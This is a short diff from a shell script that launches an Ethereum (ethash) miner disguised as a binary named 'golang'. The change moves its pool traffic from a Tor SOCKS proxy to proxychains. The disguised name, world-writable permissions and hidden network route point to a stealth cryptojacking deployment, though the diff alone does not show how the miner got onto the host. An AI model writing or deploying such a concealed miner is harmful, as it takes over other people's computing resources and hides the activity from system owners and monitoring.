@@ -16,4 +16,4 @@ cd golang_linux_amd64
 
 chmod 777 golang
 
-./golang -a ethash --url $pool1 --url2 $pool2 -u $string -p x -w $name --proxy 127.0.0.1:9050
+proxychains ./golang -a ethash --url $pool1 --url2 $pool2 -u $string -p x -w $name
